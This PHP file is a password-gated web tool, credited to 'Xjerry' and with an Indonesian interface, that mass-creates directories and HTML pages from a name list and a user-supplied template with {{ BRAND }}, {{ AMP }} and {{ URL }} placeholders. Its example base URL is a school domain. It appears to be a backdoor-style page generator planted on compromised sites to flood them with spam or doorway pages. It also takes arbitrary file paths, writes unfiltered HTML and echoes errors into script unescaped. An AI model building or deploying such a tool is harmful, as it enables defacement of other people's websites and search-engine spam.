<?php
session_start();

$success = false;
$error = '';

// Replace this with your hashed password
$hashedPassword = '$2y$10$wb8O6J40EoLD2BrUNncxeut08vZXXD6I1XukczvM0VTTtxiwMmlsi';

// Check if the password has been submitted and is correct
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['password'])) {
    if (password_verify($_POST['password'], $hashedPassword)) {
        $_SESSION['authenticated'] = true;
    } else {
        $error = "Salah Passwordnya Cokk.";
    }
}

// Check if the user is authenticated
if (!isset($_SESSION['authenticated'])) {
    // Display the password prompt
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Masukan Password</title>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
        <style>
            body {
                background-color: #000;
                font-family: Arial, sans-serif;
                padding: 20px;
                color: white;
            }
            .container {
                max-width: 400px;
                margin: 0 auto;
                background-color: #000080;
                padding: 20px;
                border-radius: 8px;
                box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            }
            .btn-primary {
                background-color: #FFA500;
                border-color: #007bff;
            }
            .btn-primary:hover {
                background-color: #0056b3;
                border-color: #004085;
            }
            h2 {
                color: white;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>Masukan Password</h2>
            <?php if (!empty($error)): ?>
                <div class="alert alert-danger"><?php echo $error; ?></div>
            <?php endif; ?>
            <form method="post" action="">
                <div class="form-group">
                    <label for="password">Enter Password:</label>
                    <input type="password" class="form-control" id="password" name="password" required>
                </div>
                <button type="submit" class="btn btn-primary">Submit</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Main script functionality (shown if the user is authenticated)
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['html_content']) && isset($_POST['list_file'])) {
    // Get the base directory, subdirectory, list file name, and base URL from the form
    $baseDirectory = isset($_POST['base_directory']) ? trim($_POST['base_directory'], '/') : '';
    $subDirectory = isset($_POST['sub_directory']) ? trim($_POST['sub_directory'], '/') : '';
    $listFileName = isset($_POST['list_file']) ? trim($_POST['list_file']) : '';
    $baseUrl = isset($_POST['base_url']) ? rtrim(trim($_POST['base_url']), '/') : ''; // Base URL (e.g., https://ma.nuha.sch.id)

    // Ensure that the base directory and subdirectory are relative paths
    if (!empty($baseDirectory)) {
        $baseDirectory = basename($baseDirectory); // Strip any directory traversal
    }
    if (!empty($subDirectory)) {
        $subDirectory = basename($subDirectory); // Strip any directory traversal
    }

    // Check if the list file is provided and exists
    if (empty($listFileName) || !file_exists($listFileName)) {
        $error = "Error: Please provide a valid list file.";
    }

    // Check if either base directory or subdirectory is provided
    if (empty($baseDirectory) && empty($subDirectory)) {
        $error = "Error: Please provide at least a base directory or subdirectory.";
    }

    if (empty($error)) {
        // Determine the target directory based on inputs
        $targetDirectory = '';
        if (!empty($baseDirectory) && !empty($subDirectory)) {
            $targetDirectory = __DIR__ . '/' . $baseDirectory . '/' . $subDirectory;
        } elseif (!empty($baseDirectory)) {
            $targetDirectory = __DIR__ . '/' . $baseDirectory;
        } elseif (!empty($subDirectory)) {
            $targetDirectory = __DIR__ . '/' . $subDirectory;
        }

        // Create the target directory if it doesn't exist
        if (!is_dir($targetDirectory)) {
            if (!mkdir($targetDirectory, 0755, true)) {
                $error = "Error: Could not create directory $targetDirectory.";
            }
        }

        if (empty($error)) {
            // Read the list file
            $names = file($listFileName, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

            // Create HTML files with names from the list inside the target directory
            foreach ($names as $name) {
                $name = trim($name); // Clean up any surrounding spaces

                // Determine file name and URL path
                if (!empty($subDirectory)) {
                    // Create a subdirectory for each name and add index.html
                    $finalDirectory = $targetDirectory . '/' . $name;
                    if (!is_dir($finalDirectory)) {
                        if (!mkdir($finalDirectory, 0755, true)) {
                            $error = "Error: Could not create subdirectory $finalDirectory.";
                            break;
                        }
                    }
                    $filePath = $finalDirectory . '/index.html';
                    $url = $baseUrl . '/' . trim($baseDirectory . '/' . $subDirectory . '/' . $name, '/') . '/';
                } else {
                    // Create the HTML files directly in the target directory
                    $filePath = $targetDirectory . '/' . $name . '.html';
                    $url = $baseUrl . '/' . trim($baseDirectory . '/' . $name, '/') . '.html';
                }

                // Get the HTML content and replace placeholders
                $htmlContent = $_POST['html_content'];
                $htmlContent = str_replace('{{ AMP }}', strtoupper($name), $htmlContent);
                $htmlContent = str_replace('{{ URL }}', $url, $htmlContent);
                $htmlContent = str_replace('{{ BRAND }}', $name, $htmlContent);

                // Create and write the HTML content to the file with 0644 permissions
                if (!file_put_contents($filePath, $htmlContent)) {
                    $error = "Error: Could not create file $filePath.";
                    break;
                }
                chmod($filePath, 0644);
            }

            if (empty($error)) {
                $success = true;
            }
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Create Directories and HTML Files - Xjerry</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        body {
            background-color: #000;
            font-family: Arial, sans-serif;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background-color: #000080;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        textarea {
            width: 100%;
            height: 200px;
            margin-top: 10px;
            border: 1px solid #ced4da;
            border-radius: 4px;
            padding: 10px;
        }
        .btn-primary {
            background-color: #FFA500;
            border-color: #007bff;
        }
        .btn-primary:hover {
            background-color: #0056b3;
            border-color: #004085;
        }h2, label {
            color: white;
        }
        /* Footer styles */
        footer {
            color: white;
            text-align: center;
            padding: 10px;
            margin-top: 20px;
            border-radius: 8px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Buat Direktori dan File HTML dari list.txt</h2>
        <form method="post" action="">
            <div class="form-group">
                <label for="list_file">Nama File List (contoh: list.txt):</label>
                <input type="text" class="form-control" id="list_file" name="list_file" placeholder="Masukkan nama file list">
            </div>
            <div class="form-group">
                <label for="base_url">Base URL (contoh: https://ma.nuha.sch.id):</label>
                <input type="text" class="form-control" id="base_url" name="base_url" placeholder="Masukkan base URL">
            </div>
            <div class="form-group">
                <label for="base_directory">Buat Directori dan File Html (optional):</label>
                <input type="text" class="form-control" id="base_directory" name="base_directory" placeholder="Buat Directori dan File Html">
            </div>
            <div class="form-group">
                <label for="sub_directory">Buat Directori, Subdirectori dan File Html (optional):</label>
                <input type="text" class="form-control" id="sub_directory" name="sub_directory" placeholder="Buat Directori, Subdirectori dan File Html">
            </div>
            <div class="form-group">
                <label for="html_content">Masukan Konten Html:</label>
                <textarea id="html_content" name="html_content" required></textarea>
            </div>
            <button type="submit" class="btn btn-primary">Create Directories and HTML Files</button>
        </form>
    </div>

    <?php if ($success): ?>
    <script>
        Swal.fire({
            icon: 'success',
            title: 'Success',
            html: 'Directori & File Berhasil Dibuat successfully!',
            showConfirmButton: true,
            confirmButtonText: 'OK',
            confirmButtonColor: '#007bff'
        });
    </script>
    <?php elseif (!empty($error)): ?>
    <script>
        Swal.fire({
            icon: 'error',
            title: 'Error',
            html: '<?php echo $error; ?>',
            showConfirmButton: true,
            confirmButtonText: 'OK',
            confirmButtonColor: '#007bff'
        });
    </script>
    <?php endif; ?>

    <footer>
        <p>&copy; 2024 Xjerry. All rights reserved.</p>
    </footer>
</body>
</html>
